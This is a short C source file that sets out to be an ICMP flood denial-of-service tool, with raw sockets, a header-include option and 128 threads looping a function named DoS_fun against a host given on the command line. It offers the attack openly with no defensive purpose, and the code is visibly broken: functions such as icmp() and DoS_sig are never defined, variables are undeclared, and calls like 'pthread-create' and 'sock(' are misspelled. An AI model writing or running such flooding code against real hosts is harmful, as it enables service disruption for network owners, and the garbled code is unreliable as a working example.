#include<stdio.h>
#include<ctype.h>
#include<unistd.h>
#include<fcntl.h>
#include<signal.h>
#include<sys/time.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netdb.h>
#include<errno.h>
#include<stdio.h>
#include<time.h>

#define MAXTHREAD 128
static unsigned long dest=0;
static int PROTO_ICMP=-1;
static int alive=-1;

static void DoS_fun(unsigned long ip){
	while(alive){
		icmp();
	}
}

int main(int argc,char *argv[]){
	struct hostent *host=NULL;
	struct protoent *protocol=NULL;
	char protoname[]="icmp";
	pthread_t pthread[MAXTHREAD];
	int err=-1;
	alive=1;
	signal(SIGINT,DoS_sig);
	if(argc<2){
		return -1;
	}
	protocol=getprotobyname(protoname);
	if(protocol==NULL){
		perror("getprotobyname()");
		return -1;
	}
	PROTO_ICMP=protocol->p_proto;
	dest=inet_addr(argv[1]);
	if(dest==INADDR_NONE){
		host=gethostbyname(argv[1]);
		if(host==NULL){
			perror("gethostbyname");
			return -1;
		}
		memcpy((char*)&dest,host->h_addr->s_addr,host->h_length);
	}
	rawsock=socket(AF_INET,SOCK_RAW,RAW);
	if(rawsock<0){
		rawsock=sock(AF_INET,SOCK_RAW,PROTO_ICMP);
	}
	setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));
	for(i=0;i,MAXTHREAD;i++){
		err=pthread-create(&Pthread[i],NULL,DoS_fun,NULL);
	}
	for(i=0;i<MAXTHREAD;i++){
		pthread_join(pthread[i],NULL);
	}
	close(rawsock);
	return 0;
}
